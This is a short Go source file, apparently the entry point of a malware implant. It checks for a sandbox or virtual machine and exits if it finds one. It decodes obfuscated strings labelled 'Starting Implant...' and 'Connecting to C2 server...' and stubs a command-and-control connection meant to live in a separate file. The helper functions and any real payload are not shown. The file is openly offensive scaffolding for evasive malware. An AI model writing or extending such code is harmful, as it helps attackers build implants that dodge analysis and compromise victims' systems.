package main

import (
	"fmt"
	"time"
)

func main() {
	// Sandbox & VM Detection
	if isSandbox() {
		fmt.Println("Exiting: Sandbox detected!")
		return
	}

	fmt.Println(decryptString("5wLkq8s5LsFAAwkBAAQAACEiBCl8AA==")) // "Starting Implant..."

	// Simulate C2 Connection (Will be implemented in comms.go)
	time.Sleep(3 * time.Second)
	fmt.Println(decryptString("Z2hjMnM2a21hb2ZmYXI=")) // "Connecting to C2 server..."
}
